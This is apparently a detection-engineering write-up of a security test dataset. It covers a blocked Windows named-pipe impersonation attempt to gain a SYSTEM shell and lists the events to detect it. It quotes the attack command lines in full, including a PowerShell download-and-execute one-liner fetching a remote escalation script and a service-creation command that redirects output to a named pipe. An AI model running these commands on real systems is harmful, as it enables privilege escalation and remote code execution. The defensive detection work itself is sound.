# T1106-4: Native API — WinPwn - Get SYSTEM shell - Pop System Shell using NamedPipe Impersonation technique

## Technique Context

T1106 Native API covers adversary use of native operating system APIs to execute behaviors. This specific test demonstrates a sophisticated privilege escalation technique using named pipe impersonation to achieve SYSTEM privileges. The technique creates a named pipe server, uses a Windows service to connect as SYSTEM, and leverages pipe impersonation to duplicate the SYSTEM token for spawning elevated processes. This is a classic Windows privilege escalation vector that exploits the design of named pipes and service execution contexts. Detection engineers focus on monitoring pipe creation patterns, service manipulation, and token manipulation behaviors that characterize this attack method.

## What This Dataset Contains

This dataset captures a complete named pipe impersonation attack sequence. The initial PowerShell process (PID 36108) downloads and executes the NamedPipeSystem.ps1 script from GitHub, creating a comprehensive C# assembly via `Add-Type`. Security event 4688 shows the PowerShell command line: `"powershell.exe" & {iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Get-System-Techniques/master/NamedPipe/NamedPipeSystem.ps1')}`. 

Sysmon captures the critical named pipe creation with EID 17: `\HighPriv` pipe created by PowerShell PID 36108. The technique creates a temporary service `svcHighPriv` via `New-Service -Name svcHighPriv -BinaryPathName 'C:\windows\system32\cmd.exe /C echo Uuup! > \\.\pipe\HighPriv'`, evidenced by registry writes to `HKLM\System\CurrentControlSet\Services\svcHighPriv\ImagePath` and System event 7045 showing service installation.

When the service starts, it spawns cmd.exe (PID 36096) with command line `C:\windows\system32\cmd.exe /C echo Uuup! > \\.\pipe\HighPriv`, which connects to the named pipe as SYSTEM. The attack creates multiple PowerShell child processes including the final elevated PowerShell instance (PID 38028) spawned through token impersonation. The C# compiler (csc.exe) execution shows the Add-Type compilation process, with temporary files created in `C:\Windows\SystemTemp\3xktbnny\`.

## What This Dataset Does Not Contain

The dataset doesn't capture successful token impersonation events due to Windows Defender's behavioral protection. The Start-Service command fails with a PowerShell error: "Service 'svcHighPriv (svcHighPriv)' cannot be started due to the following error: Cannot start service svcHighPriv on computer '.'". System event 7009 shows the service timeout, and 7000 indicates startup failure. 

While the named pipe is created and the service infrastructure is established, the actual impersonation and token duplication phases appear blocked. The dataset lacks Sysmon events showing successful process creation with impersonated tokens or privilege escalation confirmation. The final PowerShell process (PID 38028) appears to be spawned but without evidence of enhanced privileges.

## Assessment

This dataset provides excellent visibility into the setup phases of named pipe impersonation attacks but captures a blocked execution due to endpoint protection. The telemetry quality is strong for detection development covering the initial reconnaissance, script download, C# compilation, service creation, and pipe establishment phases. Security event logs provide comprehensive process creation chains, and Sysmon delivers crucial pipe creation events and network connections.

The PowerShell script block logging captures the entire malicious C# source code, providing defenders with complete visibility into the attack methodology. However, the blocked execution limits the dataset's utility for understanding successful privilege escalation indicators. This makes it valuable for detecting attempt patterns but less useful for post-exploitation behavior analysis.

## Detection Opportunities Present in This Data

1. **PowerShell web client download patterns**: Detect `iex(new-object net.webclient).downloadstring()` execution patterns from suspicious domains like raw.githubusercontent.com

2. **C# compilation via Add-Type**: Monitor PowerShell processes spawning csc.exe with large C# codebases containing Windows API imports like `ImpersonateNamedPipeClient`, `DuplicateTokenEx`, and `CreateProcessWithTokenW`

3. **Named pipe creation with suspicious names**: Alert on Sysmon EID 17 pipe creation events with names like `\HighPriv` or other non-standard pipe naming conventions

4. **Service creation with pipe redirection**: Detect new service registrations with BinaryPathName containing pipe redirection syntax (`> \\.\pipe\`)

5. **Service manipulation for privilege escalation**: Monitor rapid service creation, start attempts, and deletion sequences, especially when the service binary involves cmd.exe with pipe operations

6. **PowerShell execution chain analysis**: Correlate parent-child PowerShell relationships where child processes are spawned through .NET reflection and process creation APIs

7. **Registry modifications for service persistence**: Track registry writes to `HKLM\System\CurrentControlSet\Services\` with suspicious ImagePath values containing command redirection

8. **Token manipulation attempt patterns**: Monitor for PowerShell processes accessing other processes with high-privilege access rights (0x1FFFFF) as shown in Sysmon EID 10 events
